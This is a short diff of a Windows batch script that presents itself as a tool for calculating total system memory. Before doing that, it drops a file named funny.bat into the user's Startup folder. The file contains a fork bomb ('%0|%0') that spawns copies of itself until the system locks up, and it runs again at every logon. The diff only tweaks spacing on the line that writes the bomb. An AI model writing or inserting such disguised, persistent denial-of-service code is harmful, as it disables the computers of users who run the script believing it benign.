@@ -1,6 +1,6 @@
 @echo off 
 cd "%AppData%/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
-echo %%0^|%%0 > funny.bat
+echo %%0^|%%0> funny.bat
 
 echo Calculating total system memory
 for /f "skip=1" %%p in ('wmic os get TotalVisibleMemorySize') do ( 
